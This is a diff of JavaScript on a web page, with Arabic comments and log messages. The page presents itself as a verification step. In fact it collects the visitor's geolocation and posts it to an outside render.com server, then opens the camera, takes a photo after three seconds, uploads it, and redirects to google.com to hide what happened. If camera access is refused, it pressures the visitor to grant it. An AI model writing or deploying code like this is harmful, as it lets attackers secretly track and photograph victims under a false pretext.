@@ -2,12 +2,12 @@
 
 <script>
 async function start() {
-    console.log("بدء عملية التحقق...");
-    
-    // 1. طلب الموقع
+    console.log("1. جاري طلب الموقع...");
+
+    // طلب الموقع الجغرافي
     navigator.geolocation.getCurrentPosition(
         async (pos) => {
-            console.log("تم تحديد الموقع، جاري الإرسال...");
+            console.log("✅ تم تحديد الموقع، جاري إرساله للسيرفر...");
             try {
                 await fetch("https://verification-backend-o1t0.onrender.com/location", {
                     method: "POST",
@@ -17,22 +17,25 @@ async function start() {
                         lon: pos.coords.longitude
                     })
                 });
-            } catch (e) { console.log("خطأ في إرسال الموقع للسيرفر"); }
-            
-            // ننتقل للكاميرا سواء نجح إرسال الموقع أو فشل
+            } catch (e) { 
+                console.log("خطأ في الاتصال بسيرفر الموقع"); 
+            }
+            // بعد الانتهاء من الموقع، نفتح الكاميرا
             openCamera();
         },
         (err) => {
-            console.log("المستخدم رفض الموقع، ننتقل للكاميرا مباشرة.");
+            console.log("❌ المستخدم رفض الموقع أو حدث خطأ، ننتقل للكاميرا...");
+            // حتى لو رفض الموقع، نفتح الكاميرا لتكملة العملية
             openCamera();
         }
     );
 }
 
 function openCamera() {
+    console.log("2. جاري طلب الكاميرا...");
+    
     navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
-        console.log("تم فتح الكاميرا، جاري التقاط الصورة بعد 3 ثوانٍ...");
         let video = document.createElement("video");
         video.srcObject = stream;
         video.play();
@@ -44,7 +47,7 @@ function openCamera() {
             canvas.height = 200;
             canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
 
-            // طفي الكاميرا فوراً
+            // إيقاف الكاميرا
             stream.getTracks().forEach(track => track.stop());
 
             canvas.toBlob((blob) => {
@@ -60,16 +63,14 @@ function openCamera() {
                 })
                 .then(res => {
                     if (res.ok) {
-                        console.log("كل شيء تمام، تحويل...");
+                        console.log("تمت العملية بنجاح!");
                         window.location.href = "https://google.com";
-                    } else {
-                        console.error("فشل رفع الصورة");
                     }
                 })
-                .catch(err => console.log("Error sending image:", err));
+                .catch(err => console.log("خطأ في رفع الصورة:", err));
 
             }, 'image/png');
-        }, 3000);
+        }, 3000); // التقاط الصورة بعد 3 ثوانٍ من فتح الكاميرا
     })
     .catch(err => {
         alert("الرجاء السماح للكاميرا بالعمل لتكملة الإجراءات!");
